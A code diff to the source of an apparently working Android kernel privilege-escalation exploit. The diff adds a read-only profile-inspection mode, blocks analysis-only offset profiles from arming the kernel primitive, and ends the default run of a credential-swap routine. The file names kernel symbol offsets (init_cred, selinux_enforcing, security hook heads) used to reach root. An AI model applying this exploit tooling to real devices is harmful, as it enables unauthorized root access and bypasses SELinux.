@@ -18,75 +18,67 @@
 
 const struct kernel_offsets *active_offsets = NULL;
 
-/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
-#undef SELINUX_ENFORCING_OFF
-#undef INIT_CRED_OFF
-#undef INIT_TASK_OFF
-#undef INIT_UTS_NS_OFF
-#undef EMPTY_ZERO_PAGE_OFF
-#undef ROOT_TASK_GROUP_OFF
-#undef KPTR_RESTRICT_OFF
-#undef SELINUX_BLOB_SIZES_OFF
-#undef SECURITY_HOOK_HEADS_OFF
-#undef KMALLOC_CACHES_OFF
-#undef ANON_PIPE_BUF_OPS_OFF
-#undef ASHMEM_MISC_FOPS_OFF
-#undef ASHMEM_FOPS_OFF
-#undef ASHMEM_IOCTL_OFF
-#undef ASHMEM_COMPAT_IOCTL_OFF
-#undef ASHMEM_MMAP_OFF
-#undef ASHMEM_OPEN_OFF
-#undef ASHMEM_RELEASE_OFF
-#undef ASHMEM_SHOW_FDINFO_OFF
-#undef CONFIGFS_READ_ITER_OFF
-#undef CONFIGFS_BIN_WRITE_ITER_OFF
-#undef COPY_SPLICE_READ_OFF
-#undef NOOP_LLSEEK_OFF
-#undef CAP_CAPABLE_ACTIVE_OFF
-#undef SLIDE_NFULNL_LOGGER_OFF
-#undef SLIDE_LOGGERS_0_1_OFF
-#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
-#undef SLIDE_SYSCTL_BOOTID_OFF
-
-#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
-#define INIT_CRED_OFF                 active_offsets->off_init_cred
-#define INIT_TASK_OFF                 active_offsets->off_init_task
-#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
-#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
-#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
-#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
-#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
-#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
-#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
-#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
-#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
-#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
-#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
-#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
-#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
-#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
-#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
-#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
-#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
-#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
-#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
-#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
-#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
-#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
-#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
-#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id
-
-/* Override struct field offsets (task_struct, etc.) with per-device values */
+/* Select symbol, address-space and structure offsets in every translation
+ * unit, not just main.c. */
 #include "runtime_struct_offsets.h"
+
+static const struct kernel_offsets *find_offsets_for_release(const char *release) {
+  for (int i = 0; known_offsets[i].uname_r; i++) {
+    if (strcmp(release, known_offsets[i].uname_r) == 0)
+      return &known_offsets[i];
+  }
+  return NULL;
+}
+
+/* Read-only profile inspection.  This deliberately does not publish the
+ * selected profile through active_offsets and therefore cannot initialize an
+ * address conversion or kernel primitive. */
+static int print_profile_info(const char *release_override) {
+  struct utsname uts;
+  const char *release = release_override;
+  if (!release) {
+    if (uname(&uts) < 0) {
+      perror("uname");
+      return 1;
+    }
+    release = uts.release;
+  }
+
+  const struct kernel_offsets *profile = find_offsets_for_release(release);
+  printf("kernel=%s\n", release);
+  if (!profile) {
+    printf("profile=missing\n");
+    return 1;
+  }
+  printf("profile=present\n");
+  printf("analysis_only=%u\n", profile->analysis_only);
+  printf("analysis_blocker=%s\n",
+         profile->analysis_blocker ? profile->analysis_blocker : "");
+  printf("kimage_text_base=0x%016llx\n",
+         (unsigned long long)profile->kimage_text_base);
+  printf("phys_offset=0x%016llx\n",
+         (unsigned long long)profile->phys_offset);
+  printf("kernel_phys_load=0x%016llx\n",
+         (unsigned long long)profile->kernel_phys_load);
+  printf("primitive_arming=%s\n",
+         profile->analysis_only ? "REFUSED" : "profile-eligible");
+  return 0;
+}
 
 static int select_offsets(void) {
   struct utsname uts;
   if (uname(&uts) < 0) return -1;
   pr_info("kernel: %s\n", uts.release);
-  for (int i = 0; known_offsets[i].uname_r; i++) {
-    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
-      active_offsets = &known_offsets[i];
+  const struct kernel_offsets *candidate = find_offsets_for_release(uts.release);
+  if (candidate) {
+      if (candidate->analysis_only) {
+        pr_error("profile is analysis-only: %s\n",
+                 candidate->analysis_blocker ? candidate->analysis_blocker :
+                 "required values are not proven");
+        pr_error("refusing to arm any kernel primitive\n");
+        return -1;
+      }
+      active_offsets = candidate;
       pr_success("offsets matched: %s\n", active_offsets->uname_r);
       /* Publish per-device symbol addresses that other TUs need. INIT_CRED
        * here expands via the redefined INIT_CRED_OFF above, i.e. the runtime
@@ -102,7 +94,6 @@ static int select_offsets(void) {
       pr_info("init_cred image=%016zx alias=%016zx\n",
               (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
       return 0;
-    }
   }
   pr_error("no offsets for kernel: %s\n", uts.release);
   pr_error("add this kernel to offsets.h and rebuild\n");
@@ -2914,6 +2905,8 @@ static void ghost_segv_handler(int sig, siginfo_t *si, void *uc) {
 }
 
 int main(int argc, char **argv) {
+    if (argc > 1 && strcmp(argv[1], "--profile-info") == 0)
+        return print_profile_info(argc > 2 ? argv[2] : NULL);
     struct sigaction sa = { .sa_sigaction = ghost_segv_handler,
                             .sa_flags = SA_SIGINFO };
     sigaction(SIGSEGV, &sa, NULL);
@@ -2927,5 +2920,8 @@ int main(int argc, char **argv) {
         return run_selftest();
     if (argc > 1 && strcmp(argv[1], "--cred") == 0)
         return run_cred_swap();
-    return run_cred_swap();
+    fprintf(stderr,
+            "No action selected. Use --profile-info for read-only profile "
+            "inspection.\n");
+    return 2;
 }
